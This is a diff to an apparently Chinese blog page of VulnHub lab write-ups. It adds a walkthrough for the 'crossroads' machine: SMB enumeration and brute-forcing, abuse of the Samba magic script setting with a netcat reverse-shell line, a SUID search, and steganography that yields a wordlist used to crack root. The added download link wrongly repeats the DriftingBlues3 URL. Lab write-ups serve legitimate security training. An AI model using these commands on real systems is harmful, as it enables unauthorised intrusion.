@@ -80,7 +80,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">86</span>
+            <span class="post-count">371</span>
         </span>
     </span>
 
@@ -110,6 +110,30 @@
 <h2 id="4、BEELZEBUB"><a href="#4、BEELZEBUB" class="headerlink" title="4、BEELZEBUB  "></a><strong><font size=4>4、BEELZEBUB</font></strong>  </h2><p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/beelzebub-1,742/">https://www.vulnhub.com/entry/beelzebub-1,742/</a><br><img src="/pic/vulnhub/BEELZEBUB.png">  </p>
 <h2 id="5、MoneyBox"><a href="#5、MoneyBox" class="headerlink" title="5、MoneyBox  "></a><strong><font size=4>5、MoneyBox</font></strong>  </h2><p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/moneybox-1,653/">https://www.vulnhub.com/entry/moneybox-1,653/</a><br><img src="/pic/vulnhub/MoneyBox.png">  </p>
 <h2 id="6、DriftingBlues3"><a href="#6、DriftingBlues3" class="headerlink" title="6、DriftingBlues3  "></a><strong><font size=4>6、DriftingBlues3</font></strong>  </h2><p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/driftingblues-3,656/">https://www.vulnhub.com/entry/driftingblues-3,656/</a><br><img src="/pic/vulnhub/DriftingBlues3.png">  </p>
+<h2 id="7、crossroads"><a href="#7、crossroads" class="headerlink" title="7、crossroads  "></a><strong><font size=4>7、crossroads</font></strong>  </h2><p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/driftingblues-3,656/">https://www.vulnhub.com/entry/driftingblues-3,656/</a><br>1、端口扫描<br>2、smb服务  </p>
+<ul>
+<li>信息收集enum4linux IP -a</li>
+<li>smb爆破use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_login</li>
+<li><img src="/pic/vulnhub/crossroads1.png">  </li>
+<li>run</li>
+<li>访问smb文件<img src="/pic/vulnhub/crossroads2.png"></li>
+<li>配置文件中发现magic script&#x3D;smbscript.sh</li>
+<li>自己写一个smbscript.sh反弹shell：echo “nc -e &#x2F;bin&#x2F;bash 192.168.190.150 9999” &gt; smbscript.sh </li>
+<li>put上去<img src="/pic/vulnhub/crossroads3.png"></li>
+<li>监听端口nc -lvp 9999</li>
+<li>建立交互式shell：python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’);”</li>
+</ul>
+<p>3、提权  </p>
+<ul>
+<li>查找可提权文件find &#x2F; -perm -4000 -user root 2&gt;&#x2F;dev&#x2F;null</li>
+<li>发现文件beroot，运行.&#x2F;beroot是一个用来猜解root密码的文件，但是没有字典文件提供</li>
+<li>80端口进行目录扫描发现robots文件，访问发现图片文件</li>
+<li>stegoveritas crossroads.png 提取隐藏信息，发现第一个文件是字典文件</li>
+<li>将该文件写入passwords.txt：cat 1618375369.272224-f46a4fa787ba43cb11e9d00e6a6f83d4 &gt; &#x2F;root&#x2F;passwords.txt</li>
+<li>通过smb把passwords.txt上传上去：put</li>
+<li>把passwords.txt拷贝到&#x2F;home&#x2F;albert中，然后直接在shell中执行命令：<img src="/pic/vulnhub/crossroads4.png"></li>
+<li>可以看到最后生成了一个rootcreds，里面应该就是root的密码，sudo su切换用户，提权成功</li>
+</ul>
  
       <!-- reward -->
       
